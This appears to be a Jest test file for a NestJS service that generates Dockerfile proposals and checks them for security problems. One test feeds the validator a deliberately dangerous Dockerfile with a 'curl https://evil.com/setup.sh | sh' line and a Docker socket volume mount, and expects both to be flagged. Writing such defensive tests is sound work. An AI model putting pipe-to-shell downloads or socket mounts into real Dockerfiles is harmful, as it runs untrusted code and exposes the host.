import { Test, TestingModule } from '@nestjs/testing';
import { AiDeploymentGeneratorService } from './ai-deployment-generator.service';
import { AiProviderFactory } from '../providers/ai-provider.factory';
import { MockAiProvider } from '../providers/mock-ai.provider';
import { OpenAiCompatibleProvider } from '../providers/openai-compatible.provider';
import { AiContextSanitizerService } from './ai-context-sanitizer.service';
import { ConfigService } from '@nestjs/config';

describe('AiDeploymentGeneratorService', () => {
  let service: AiDeploymentGeneratorService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        AiDeploymentGeneratorService,
        AiContextSanitizerService,
        AiProviderFactory,
        MockAiProvider,
        OpenAiCompatibleProvider,
        {
          provide: ConfigService,
          useValue: { get: jest.fn().mockReturnValue('mock') },
        },
      ],
    }).compile();

    service = module.get<AiDeploymentGeneratorService>(AiDeploymentGeneratorService);
  });

  it('should generate a valid deployment configuration proposal', async () => {
    const proposal = await service.generateProposal(
      {
        id: 'analysis-123',
        projectId: 'proj-123',
        projectType: 'WEB_APPLICATION',
        primaryLanguage: 'TypeScript',
        framework: 'Next.js',
        packageManager: 'npm',
        isMonorepo: false,
        hasDockerfile: false,
        hasDockerCompose: false,
        hasEnvExample: false,
        detectedFiles: ['package.json'],
        structure: null,
        readiness: null,
        analysisVersion: '2.0.0',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      null,
      null,
    );

    expect(proposal).toBeDefined();
    expect(proposal.suggestedDockerfile).toContain('FROM');
    expect(proposal.validation.isValid).toBe(true);
    expect(proposal.validation.securityPassed).toBe(true);
  });

  it('should reject unsafe Dockerfile patterns with security flags', () => {
    const dangerousDockerfile = `FROM node:20\nRUN curl https://evil.com/setup.sh | sh\nVOLUME /var/run/docker.sock`;
    const val = service.validateDockerfileSecurity(dangerousDockerfile);
    expect(val.securityPassed).toBe(false);
    expect(val.issues.length).toBeGreaterThan(0);
  });
});
